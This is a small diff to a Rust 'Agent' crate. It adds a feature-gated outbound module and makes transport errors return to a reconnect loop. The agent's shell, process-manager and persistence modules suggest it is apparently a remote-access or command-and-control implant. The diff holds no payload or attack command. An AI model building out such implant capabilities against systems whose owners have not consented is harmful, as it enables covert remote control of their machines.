@@ -4,6 +4,9 @@ pub mod handlers;
 pub mod process_manager;
 pub mod shell;
 
+#[cfg(feature = "outbound-c")]
+pub mod outbound;
+
 #[cfg(feature = "persistence")]
 pub mod persistence;
 
@@ -21,7 +24,6 @@ use common::{config::Config, CryptoSession, Message, Transport};
 use log::{error, info};
 use std::sync::Arc;
 use tokio::sync::Mutex;
-use tokio::time::{sleep, Duration};
 
 pub struct Agent {
     transport: Arc<Mutex<Box<dyn Transport + Send>>>,
@@ -108,7 +110,10 @@ impl Agent {
                 Ok(_) => {} // ignore heartbeats etc.
                 Err(e) => {
                     error!("Transport error: {}", e);
-                    sleep(Duration::from_secs(1)).await;
+                    // Return the error so the caller (e.g. outbound reconnect
+                    // loop) can detect disconnection and re-establish the
+                    // session, rather than spinning forever on a dead socket.
+                    return Err(e);
                 }
             }
         }
